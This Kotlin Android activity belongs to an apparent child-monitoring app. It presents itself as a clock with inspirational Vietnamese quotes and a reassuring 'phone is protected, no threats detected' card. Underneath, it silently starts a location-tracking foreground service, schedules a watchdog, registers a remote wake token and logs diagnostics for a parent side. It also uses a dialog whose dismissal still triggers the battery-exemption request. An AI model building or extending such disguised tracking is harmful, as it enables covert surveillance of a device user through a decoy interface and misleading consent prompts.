package com.family.child

import android.Manifest
import android.app.ActivityManager
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Paint
import android.graphics.Typeface
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.animation.Crossfade
import androidx.compose.animation.core.tween
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.interaction.MutableInteractionSource
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.StrokeCap
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.graphics.nativeCanvas
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.delay
import java.time.LocalDateTime
import kotlin.math.cos
import kotlin.math.sin

class MainActivity : ComponentActivity() {
    private var showContinuousRunPrompt by mutableStateOf(false)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            ClockScreen(
                showContinuousRunPrompt = showContinuousRunPrompt,
                onAllowContinuousRun = {
                    showContinuousRunPrompt = false
                    requestContinuousRunPermission()
                }
            )
        }
        maybeShowContinuousRunPromptOnce()
        evaluateSilentSetup()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        evaluateSilentSetup()
    }

    override fun onResume() {
        super.onResume()
        recordLastProcessExitReason()
        evaluateSilentSetup()
    }

    private fun maybeShowContinuousRunPromptOnce() {
        val prefs = getSharedPreferences(PREFS, MODE_PRIVATE)
        if (prefs.getBoolean(KEY_CONTINUOUS_PROMPT_SHOWN, false)) return
        // Mark as shown immediately so the app never nags again even if the user
        // dismisses the Android system screen and chooses to configure it manually.
        prefs.edit()
            .putBoolean(KEY_CONTINUOUS_PROMPT_SHOWN, true)
            .putLong(KEY_CONTINUOUS_PROMPT_SHOWN_AT, System.currentTimeMillis())
            .apply()
        showContinuousRunPrompt = true
    }

    private fun evaluateSilentSetup() {
        ServiceWatchdogWorker.schedule(this)

        val fineGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
        val backgroundGranted = Build.VERSION.SDK_INT < 29 || ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
        val notificationGranted = Build.VERSION.SDK_INT < 33 || ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.POST_NOTIFICATIONS
        ) == PackageManager.PERMISSION_GRANTED
        val power = getSystemService(PowerManager::class.java)
        val batteryExempt = Build.VERSION.SDK_INT < 23 || power.isIgnoringBatteryOptimizations(packageName)
        val activity = getSystemService(ActivityManager::class.java)
        val backgroundRestricted = Build.VERSION.SDK_INT >= 28 && activity.isBackgroundRestricted

        getSharedPreferences(PREFS, MODE_PRIVATE).edit()
            .putBoolean("silent_fine_permission_granted", fineGranted)
            .putBoolean("silent_background_permission_granted", backgroundGranted)
            .putBoolean("silent_notification_permission_granted", notificationGranted)
            .putBoolean("battery_optimization_ignored", batteryExempt)
            .putBoolean("background_restricted", backgroundRestricted)
            .putLong("silent_setup_checked_at", System.currentTimeMillis())
            .apply()

        // Runtime/system permissions are intentionally never requested from this
        // screen. Missing prerequisites remain a diagnostic for Parent/Health.
        if (fineGranted) {
            try {
                ContextCompat.startForegroundService(
                    this,
                    Intent(this, LocationService::class.java).putExtra("immediate", true)
                )
                getSharedPreferences(PREFS, MODE_PRIVATE).edit()
                    .putString("silent_start_result", "requested")
                    .apply()
            } catch (e: Exception) {
                getSharedPreferences(PREFS, MODE_PRIVATE).edit()
                    .putString("silent_start_result", "failed:${e.javaClass.simpleName}")
                    .putLong("silent_start_failed_at", System.currentTimeMillis())
                    .apply()
            }
        } else {
            getSharedPreferences(PREFS, MODE_PRIVATE).edit()
                .putString("silent_start_result", "waiting_for_system_permission")
                .apply()
        }

        // Refreshing the token here ensures an upgrade receives a wake token even
        // when Firebase does not invoke onNewToken during this particular install.
        FirebaseMessaging.getInstance().token
            .addOnSuccessListener { ChildWakeMessagingService.syncToken(this, it) }
            .addOnFailureListener {
                getSharedPreferences(PREFS, MODE_PRIVATE).edit()
                    .putString("fcm_token_result", "failed:${it.javaClass.simpleName}")
                    .putLong("fcm_token_failed_at", System.currentTimeMillis())
                    .apply()
            }
    }

    private fun requestContinuousRunPermission() {
        try {
            if (Build.VERSION.SDK_INT >= 23) {
                val power = getSystemService(PowerManager::class.java)
                if (!power.isIgnoringBatteryOptimizations(packageName)) {
                    startActivity(
                        Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:$packageName")
                        )
                    )
                }
            }
        } catch (e: Exception) {
            getSharedPreferences(PREFS, MODE_PRIVATE).edit()
                .putString("continuous_permission_request", "failed:${e.javaClass.simpleName}")
                .putLong("continuous_permission_request_failed_at", System.currentTimeMillis())
                .apply()
        }
    }

    private fun recordLastProcessExitReason() {
        if (Build.VERSION.SDK_INT < 30) return
        try {
            val last = getSystemService(ActivityManager::class.java)
                .getHistoricalProcessExitReasons(packageName, 0, 1)
                .firstOrNull() ?: return
            getSharedPreferences(PREFS, MODE_PRIVATE).edit()
                .putInt("last_process_exit_reason", last.reason)
                .putLong("last_process_exit_at", last.timestamp)
                .putString("last_process_exit_description", last.description?.take(160) ?: "")
                .apply()
        } catch (_: Exception) {
        }
    }

    companion object {
        const val EXTRA_LOCATION_REMINDER = "show_location_reminder"
        private const val PREFS = "tracking_diag"
        private const val KEY_CONTINUOUS_PROMPT_SHOWN = "continuous_run_prompt_shown_v228"
        private const val KEY_CONTINUOUS_PROMPT_SHOWN_AT = "continuous_run_prompt_shown_at_v228"
    }
}

@Composable
fun ClockScreen(
    showContinuousRunPrompt: Boolean,
    onAllowContinuousRun: () -> Unit
) {
    val context = LocalContext.current
    var now by remember { mutableStateOf(LocalDateTime.now()) }
    var quote by remember { mutableStateOf(WisdomStore.next(context)) }
    val interaction = remember { MutableInteractionSource() }

    LaunchedEffect(Unit) {
        while (true) {
            now = LocalDateTime.now()
            delay(50L)
        }
    }

    val primary = Color(0xFF58D6FF)
    val background = Color(0xFF05080D)
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = primary,
            background = background,
            surface = Color(0xFF0D151F),
            surfaceVariant = Color(0xFF121D29)
        )
    ) {
        Box(
            Modifier
                .fillMaxSize()
                .background(
                    Brush.verticalGradient(
                        listOf(Color(0xFF07111A), background, Color(0xFF030508))
                    )
                )
                .clickable(interactionSource = interaction, indication = null) {
                    quote = WisdomStore.next(context)
                }
        ) {
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .verticalScroll(rememberScrollState())
                    .padding(horizontal = 22.dp, vertical = 26.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Spacer(Modifier.height(4.dp))
                Text(
                    "THỜI GIAN QUÝ GIÁ",
                    color = Color(0xFF7E9EB0),
                    style = MaterialTheme.typography.labelMedium
                )
                Spacer(Modifier.height(18.dp))

                Canvas(Modifier.size(294.dp)) {
                    val c = Offset(size.width / 2f, size.height / 2f)
                    val r = size.minDimension * .46f
                    drawCircle(Color(0xFF0B141E), r, c)
                    drawCircle(Color(0xFF263746), r, c, style = Stroke(2.2f))
                    drawCircle(Color(0xFF102430), r * .91f, c, style = Stroke(1.5f))
                    drawCircle(Color(0xFF081018), r * .60f, c)

                    for (i in 0 until 60) {
                        val a = Math.toRadians(i * 6.0 - 90.0)
                        val major = i % 5 == 0
                        val inner = r - if (major) 18f else 8f
                        val outer = r - 2f
                        drawLine(
                            color = if (major) Color(0xFFE7F2F8) else Color(0xFF536879),
                            start = Offset(c.x + cos(a).toFloat() * inner, c.y + sin(a).toFloat() * inner),
                            end = Offset(c.x + cos(a).toFloat() * outer, c.y + sin(a).toFloat() * outer),
                            strokeWidth = if (major) 3f else 1f,
                            cap = StrokeCap.Round
                        )
                    }

                    val numberPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
                        color = android.graphics.Color.rgb(225, 239, 247)
                        textAlign = Paint.Align.CENTER
                        textSize = r * .13f
                        typeface = Typeface.create(Typeface.DEFAULT, Typeface.BOLD)
                    }
                    for (hour in 1..12) {
                        val a = Math.toRadians(hour * 30.0 - 90.0)
                        val nr = r * .73f
                        val x = c.x + cos(a).toFloat() * nr
                        val y = c.y + sin(a).toFloat() * nr - (numberPaint.ascent() + numberPaint.descent()) / 2f
                        drawContext.canvas.nativeCanvas.drawText(hour.toString(), x, y, numberPaint)
                    }

                    fun hand(angleDeg: Double, len: Float, width: Float, color: Color) {
                        val a = Math.toRadians(angleDeg - 90.0)
                        drawLine(
                            color,
                            c,
                            Offset(c.x + cos(a).toFloat() * len, c.y + sin(a).toFloat() * len),
                            width,
                            StrokeCap.Round
                        )
                    }

                    val sec = now.second + now.nano / 1e9
                    val minNow = now.minute + sec / 60.0
                    val hourNow = (now.hour % 12) + minNow / 60.0
                    hand(hourNow * 30.0, r * .47f, 10f, Color.White)
                    hand(minNow * 6.0, r * .66f, 6f, Color.White)
                    hand(sec * 6.0, r * .80f, 2.2f, primary)
                    drawCircle(Color(0xFF061018), 13f, c)
                    drawCircle(primary, 8f, c)
                }

                Spacer(Modifier.height(24.dp))
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color(0xCC0C151E)),
                    shape = MaterialTheme.shapes.extraLarge
                ) {
                    Column(
                        Modifier.padding(horizontal = 20.dp, vertical = 18.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        Crossfade(targetState = quote, animationSpec = tween(320), label = "wisdom") { text ->
                            Text(
                                text,
                                color = Color(0xFFF0F7FA),
                                style = MaterialTheme.typography.titleMedium,
                                textAlign = TextAlign.Center
                            )
                        }
                        Spacer(Modifier.height(9.dp))
                        Text(
                            "Chạm màn hình để xem lời nhắn khác · ${WisdomStore.count()} câu",
                            color = Color(0xFF708A99),
                            style = MaterialTheme.typography.labelSmall,
                            textAlign = TextAlign.Center
                        )
                    }
                }

                Spacer(Modifier.height(16.dp))
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color(0xAA0A1821)),
                    shape = MaterialTheme.shapes.extraLarge
                ) {
                    Column(
                        Modifier.padding(horizontal = 18.dp, vertical = 15.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        Text("Lời nhắn an toàn từ gia đình", color = primary, style = MaterialTheme.typography.labelMedium)
                        Spacer(Modifier.height(6.dp))
                        Text(
                            "Điện thoại của bạn đang được bảo vệ an toàn.",
                            color = Color(0xFFD8E7EE),
                            style = MaterialTheme.typography.bodyMedium,
                            textAlign = TextAlign.Center
                        )
                        Spacer(Modifier.height(3.dp))
                        Text(
                            "Không phát hiện mối đe dọa, lừa đảo.",
                            color = Color(0xFF91AAB7),
                            style = MaterialTheme.typography.bodySmall,
                            textAlign = TextAlign.Center
                        )
                    }
                }

                Spacer(Modifier.height(20.dp))
            }
        }

        if (showContinuousRunPrompt) {
            AlertDialog(
                onDismissRequest = onAllowContinuousRun,
                title = { Text("Cho phép ứng dụng hoạt động liên tục") },
                text = {
                    Text(
                        "Cho phép ứng dụng tiếp tục hoạt động khi màn hình tắt để duy trì kết nối ổn định."
                    )
                },
                confirmButton = {
                    Button(onClick = onAllowContinuousRun) { Text("CHO PHÉP") }
                }
            )
        }
    }
}
